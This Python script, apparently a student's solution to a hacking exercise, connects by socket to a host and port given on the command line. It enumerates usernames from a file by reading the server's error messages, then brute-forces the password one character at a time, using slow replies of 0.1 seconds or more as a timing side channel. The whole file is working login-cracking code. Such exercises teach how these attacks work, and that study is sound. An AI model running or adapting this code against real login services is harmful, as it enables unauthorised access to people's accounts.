# write your code here
import itertools
import socket
import string
import sys
import json
import time


def login_reader():
    with open(r"logins.txt", "r") as file:
        for line in file.readlines():
            yield line.strip()


def password_generator(prefix):
    signs = list(string.ascii_uppercase) + list(string.ascii_lowercase) + list(string.digits)
    for sign in signs:
        word = prefix + sign
        yield word
    # for password in password_reader(prefix):
    #    for password_capitalized in capitalize(password):
    #        yield password_capitalized


def password_reader(prefix):
    with open(r'passwords.txt', 'r') as file:
        for line in [line.strip() for line in file if line.startswith(prefix)]:
            yield line.strip()


def capitalize(password):
    n = len(password)

    # Generate all possible combinations of capitalization using itertools.product()
    for combination in itertools.product(*[(c.lower(), c.upper()) if not c.isdigit() else (c,) for c in password]):
        capitalized = ''.join(combination)
        yield capitalized


def build_login_JSON_dict(login, password=''):
    login_dict = {
        "login": login,
        "password": password
    }

    return json.dumps(login_dict)


def send_and_receive(client: socket, string_to_send: str):
    string_data = string_to_send.encode()

    client.send(string_data)
    response = client.recv(102470)
    response = response.decode()

    return json.loads(response)


def connect():
    # args = [' ', "localhost", "909"]
    args = sys.argv

    address = (args[1], int(args[2]))
    with socket.socket() as client:
        client.connect(address)

        confirmed_login = ''

        for login in login_reader():

            login_dict = build_login_JSON_dict(login)
            response = send_and_receive(client, login_dict)

            if response["result"] != 'Wrong login!':
                confirmed_login = login
                break

        pre = ''
        while len(pre) < 10:
            for password in password_generator(pre):

                login_dict = build_login_JSON_dict(confirmed_login, password)

                client.send(login_dict.encode())

                start = time.perf_counter()
                response = client.recv(1024)
                end = time.perf_counter()

                response = json.loads(response.decode())

                if (end - start) >= 0.1:
                    pre = password
                    # print(pre)
                    break

                if response["result"] == 'Connection success!':
                    client.close()
                    return login_dict


if __name__ == "__main__":
    print(connect())
